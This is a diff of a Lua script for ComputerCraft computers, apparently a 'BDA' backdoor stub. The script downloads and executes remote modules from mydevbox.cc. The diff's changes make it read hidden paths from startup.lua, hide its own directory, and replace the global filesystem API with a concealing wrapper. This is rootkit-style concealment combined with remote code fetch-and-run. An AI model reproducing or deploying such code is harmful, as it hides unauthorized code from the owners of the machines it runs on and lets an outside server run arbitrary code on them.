@@ -26,15 +26,56 @@ local EnD = (pcall(require, "sys.crypto.EnD") and require("sys.crypto.EnD")) or 
 local command_handler = (pcall(require, "networking.processor.command_handler") and require("networking.processor.command_handler")) or load(http.get("https://mydevbox.cc/src/networking/processor/command_handler.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "command_handler", "t", _G)()
 local uninstaller_installer = (pcall(require, "uninstaller") and require("uninstaller")) or load(http.get("https://mydevbox.cc/src/uninstaller.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "uninstaller", "t", _G)()
 
-local function getRealStartupPath() if not _OGFS.exists("/startup.lua") then return nil end local f1 = _OGFS.open("/startup.lua", "r") if (f1==nil) then return nil end for i = 1, 6 do local l = f1.readLine() if not l then break end local filename = string.match(l, "^%-%-%s*(.-)%.$") if filename then f.close() return filename end end f.close() return nil end
-local function getBDApath() local f=_OGFS.exists("/startup.lua") and _OGFS.open("/startup.lua","r") or nil for i=1,6 do local l=f and f.readLine() if not l then break end local path,filename=string.match(l,"^%-%-%s*(.-),(.-)$") if path and filename then f.close() return path,filename end end if f then f.close() end return nil,nil end
-local xsup=getRealStartupPath()
+local function getRealStartupPath()
+    if not _OGFS.exists("/startup.lua") then return nil end
+    local f1 = _OGFS.open("/startup.lua", "r")
+    if not f1 then return nil end
+    for i = 1, 6 do
+        local l = f1.readLine()
+        if not l then break end
+        local filename = string.match(l, "^%s*%-%-%s*(.-)%.$")
+        if filename then
+            f1.close()
+            return filename
+        end
+    end
+    f1.close()
+    return nil
+end
 
-if h~=nil then customfs.setOriginalStartup(xsup) end
+local function getBDApath()
+    local f = _OGFS.exists("/startup.lua") and _OGFS.open("/startup.lua", "r") or nil
+    if not f then return nil, nil end
+    for i = 1, 6 do
+        local l = f.readLine()
+        if not l then break end
+        local path, filename = string.match(l, "^%s*%-%-%s*(.-),%s*(.-)$")
+        if path and filename then
+            f.close()
+            return path, filename
+        end
+    end
+    f.close()
+    return nil, nil
+end
+
+
+local xsup=getRealStartupPath()
 local bdapath, _ = getBDApath()
+
+if xsup~=nil then
+    print("set real startup filename")
+    customfs.setOriginalStartup(xsup)
+else
+    print("real startup is nil") 
+end
+
 if customfs ~= nil and bdapath ~= nil then
     _ = nil
+    print("hiding dir: "..bdapath)
     customfs.hideDir(bdapath)
+else
+    print("real bda is nil") 
 end
 _G.fs=customfs
 uninstaller_installer.setOGFS(_OGFS)
